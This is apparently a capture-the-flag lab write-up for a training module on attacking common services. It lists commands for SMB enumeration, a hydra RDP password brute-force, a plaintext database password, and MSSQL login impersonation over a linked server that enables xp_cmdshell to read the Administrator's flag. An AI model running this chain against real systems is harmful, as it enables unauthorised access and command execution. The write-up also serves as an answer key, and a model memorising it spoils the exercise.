# Attacking Common Services - Hard
The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

## What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)
```
nmap -T4 -p- 10.129.203.10
smbclient -N -L //10.129.203.10
smbmap -H 10.129.203.10
smbmap -u 'simon' -H 10.129.19.14
smbclient //10.129.19.14/Home -U simon
```

## Enumerate the target and find a password for the user Fiona. What is her password?
```
hydra -l Fiona -P creds.txt 10.129.19.14 rdp
```

## Once logged in, what other user can we compromise to gain admin privileges?
```
John
```

## Submit the contents of the flag.txt file on the Administrator Desktop.
```
sqsh -S 10.129.203.10 -U .\\Fiona -P '48Ns72!bns74@S84NNNSl' -h

1> SELECT name FROM master.dbo.sysdatabases
2> go

1> USE master;
2> go

1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> go

1> EXECUTE AS LOGIN = 'john';
2> go

1> EXEC ('SELECT SYSTEM_USER') AT [LOCAL.TEST.LINKED.SRV];
2> go

1> EXECUTE AS LOGIN = 'john';
2> EXEC ('EXEC sp_configure ''show advanced options'', 1;
RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];
3> go

1> EXECUTE AS LOGIN = 'john';
2> EXEC ('EXEC xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
3> go
                                                                              
1> EXECUTE AS LOGIN = 'john';
2> EXEC ('EXEC xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
3> go

```